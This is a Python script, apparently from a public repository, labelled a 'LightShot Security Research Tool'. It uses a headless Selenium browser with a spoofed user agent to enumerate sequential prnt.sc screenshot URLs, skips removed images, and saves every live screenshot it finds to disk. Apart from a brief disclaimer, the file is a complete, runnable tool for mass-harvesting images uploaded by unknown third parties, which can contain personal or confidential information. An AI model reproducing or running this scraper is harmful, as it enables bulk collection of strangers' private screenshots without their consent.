#!/usr/bin/env python3
"""
LightShot Security Research Tool

This script demonstrates security vulnerabilities in LightShot's URL structure
by systematically accessing screenshots through predictable URL patterns.

DISCLAIMER: This tool is for educational and research purposes only.
Do not use this tool for malicious purposes or unauthorized access.
Always respect rate limits and terms of service.

Author: NC1107
License: Educational Use Only
"""

import os
import sys
import string
import time
import logging
import argparse
from pathlib import Path
from typing import Optional, Generator, Tuple

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException,
    NoSuchElementException,
    WebDriverException,
)
from webdriver_manager.chrome import ChromeDriverManager


class LightShotResearcher:
    """
    A class to demonstrate LightShot URL structure vulnerabilities.

    This class provides functionality to systematically access LightShot
    screenshots through predictable URL patterns for security research.
    """

    BASE_URL = "https://prnt.sc/"
    ALPHABET = string.ascii_lowercase
    DIGITS = [str(i) for i in range(10)]

    def __init__(self, output_dir: str = "images", headless: bool = True):
        """
        Initialize the LightShot researcher.

        Args:
            output_dir: Directory to save screenshots
            headless: Run browser in headless mode
        """
        self.output_dir = Path(output_dir)
        self.headless = headless
        self.driver: Optional[webdriver.Chrome] = None
        self.session_count = 0
        self.deleted_list_file = Path("deleted_urls.txt")
        self.deleted_urls = self._load_deleted_urls()

        # Setup logging
        self._setup_logging()

        # Ensure output directory exists
        self.output_dir.mkdir(exist_ok=True)

        # Initialize WebDriver
        self._initialize_driver()

    def _load_deleted_urls(self) -> set:
        """Load previously detected deleted URLs from file."""
        if self.deleted_list_file.exists():
            with open(self.deleted_list_file, 'r') as f:
                return set(line.strip() for line in f if line.strip())
        return set()

    def _add_deleted_url(self, url_code: str) -> None:
        """Add a URL code to the deleted list file."""
        self.deleted_urls.add(url_code)
        with open(self.deleted_list_file, 'a') as f:
            f.write(f"{url_code}\n")

    def _setup_logging(self) -> None:
        """Configure logging for the application."""
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler("lightshot_research.log"),
                logging.StreamHandler(sys.stdout),
            ],
        )
        self.logger = logging.getLogger(__name__)

    def _initialize_driver(self) -> None:
        """Initialize Chrome WebDriver with appropriate options."""
        try:
            chrome_options = Options()

            if self.headless:
                chrome_options.add_argument("--headless")

            # Security and performance options
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=1920,1080")
            chrome_options.add_argument(
                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )

            # Use webdriver-manager to automatically download and manage ChromeDriver
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.set_page_load_timeout(10)

            self.logger.info("WebDriver initialized successfully")

        except Exception as e:
            self.logger.error(f"Failed to initialize WebDriver: {e}")
            raise

    def _generate_url_codes(self) -> Generator[str, None, None]:
        """
        Generate all possible URL codes in the format: [a-z][a-z][0-9][0-9][0-9][0-9]

        Yields:
            str: URL code combinations
        """
        for letter1 in self.ALPHABET:
            for letter2 in self.ALPHABET:
                for num1 in self.DIGITS:
                    for num2 in self.DIGITS:
                        for num3 in self.DIGITS:
                            for num4 in self.DIGITS:
                                yield f"{letter1}{letter2}{num1}{num2}{num3}{num4}"

    def _capture_screenshot(self, url_code: str) -> Tuple[bool, str]:
        """
        Attempt to capture a screenshot from a LightShot URL.

        Args:
            url_code: The URL code to attempt

        Returns:
            Tuple of (success, message)
        """
        # Skip if already in deleted list
        if url_code in self.deleted_urls:
            return False, "Skipped (previously deleted)"

        url = f"{self.BASE_URL}{url_code}"
        output_path = self.output_dir / f"{url_code}.png"

        try:
            self.driver.get(url)
            
            # Give the page a moment to load
            time.sleep(0.5)

            # Look for the screenshot image element
            try:
                image_element = WebDriverWait(self.driver, 3).until(
                    EC.presence_of_element_located((By.ID, "screenshot-image"))
                )
            except TimeoutException:
                return False, "No screenshot found"

            # Check the image source URL
            src = image_element.get_attribute("src")
            if not src:
                return False, "No image source"

            # The removed placeholder image has a specific pattern in the URL
            # Example: //st.prntscr.com/2023/07/24/0635/img/0_173a7b_211be8ff.png
            # This is the "screenshot was removed" placeholder
            if "/img/0_" in src and "_" in src:
                # This is the removed placeholder pattern
                self._add_deleted_url(url_code)
                return False, "Screenshot removed/deleted"

            # Check the alt text
            alt_text = image_element.get_attribute("alt")
            if alt_text and "removed" in alt_text.lower():
                self._add_deleted_url(url_code)
                return False, "Screenshot removed/deleted"

            # Get image dimensions to check if it's the tiny removed placeholder
            try:
                width = image_element.get_attribute("naturalWidth")
                height = image_element.get_attribute("naturalHeight")
                
                # The removed placeholder is typically very small
                if width and height:
                    width_int = int(width) if width.isdigit() else 0
                    height_int = int(height) if height.isdigit() else 0
                    
                    if width_int < 100 or height_int < 100:
                        self._add_deleted_url(url_code)
                        return False, "Screenshot removed/deleted (small placeholder)"
            except:
                pass

            # Take screenshot of the specific element
            if image_element.screenshot(str(output_path)):
                # Verify file was created and has reasonable size
                if output_path.exists() and output_path.stat().st_size > 5000:  # At least 5KB for real screenshots
                    self.session_count += 1
                    return True, f"Screenshot saved: {output_path}"
                else:
                    # Delete small/invalid file
                    if output_path.exists():
                        output_path.unlink()
                    self._add_deleted_url(url_code)
                    return False, "Screenshot too small (likely removed)"
            else:
                return False, "Failed to save screenshot"

        except TimeoutException:
            return False, "Timeout loading page"
        except NoSuchElementException:
            return False, "Image not found"
        except WebDriverException as e:
            return False, f"WebDriver error: {e}"
        except Exception as e:
            return False, f"Unexpected error: {e}"

    def research_vulnerabilities(
        self, max_attempts: int = 1000, delay: float = 1.0
    ) -> None:
        """
        Conduct systematic research of LightShot URLs.

        Args:
            max_attempts: Maximum number of URLs to attempt
            delay: Delay between requests in seconds
        """
        self.logger.info(f"Starting research with max {max_attempts} attempts")
        self.logger.info(f"Delay between requests: {delay} seconds")
        self.logger.info(f"Loaded {len(self.deleted_urls)} previously deleted URLs")

        successful_captures = 0
        skipped_count = 0

        try:
            for i, url_code in enumerate(self._generate_url_codes()):
                if i >= max_attempts:
                    break

                success, message = self._capture_screenshot(url_code)

                if success:
                    successful_captures += 1
                    self.logger.info(f"Success ({successful_captures}): {message}")
                elif "Skipped (previously deleted)" in message:
                    skipped_count += 1
                else:
                    self.logger.debug(f"Failed: {message}")

                # Progress update every 100 attempts
                if (i + 1) % 100 == 0:
                    self.logger.info(
                        f"Progress: {i + 1}/{max_attempts} attempts, "
                        f"{successful_captures} successful, {skipped_count} skipped"
                    )

                # Respectful delay to avoid overwhelming the server
                time.sleep(delay)

        except KeyboardInterrupt:
            self.logger.info("Research interrupted by user")
        except Exception as e:
            self.logger.error(f"Research failed: {e}")
        finally:
            self.logger.info(
                f"Research completed. Successful: {successful_captures}, "
                f"Skipped: {skipped_count}, Total deleted: {len(self.deleted_urls)}"
            )

    def cleanup(self) -> None:
        """Clean up resources."""
        if self.driver:
            try:
                self.driver.quit()
                self.logger.info("WebDriver closed successfully")
            except Exception as e:
                self.logger.warning(f"Error closing WebDriver: {e}")


def main():
    """Main entry point for the application."""
    parser = argparse.ArgumentParser(
        description="LightShot Security Research Tool",
        epilog="DISCLAIMER: For educational and research purposes only!",
    )

    parser.add_argument(
        "--output-dir", default="images", help="Directory to save screenshots"
    )

    parser.add_argument(
        "--max-attempts",
        type=int,
        default=1000,
        help="Maximum number of URLs to attempt",
    )

    parser.add_argument(
        "--delay", type=float, default=1.0, help="Delay between requests in seconds"
    )

    parser.add_argument(
        "--visible",
        action="store_true",
        help="Run browser in visible mode (not headless)",
    )

    args = parser.parse_args()

    researcher = None
    try:
        researcher = LightShotResearcher(
            output_dir=args.output_dir,
            headless=not args.visible,
        )

        researcher.research_vulnerabilities(
            max_attempts=args.max_attempts, delay=args.delay
        )

    except KeyboardInterrupt:
        print("\nResearch interrupted by user")
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)
    finally:
        if researcher:
            researcher.cleanup()


if __name__ == "__main__":
    main()
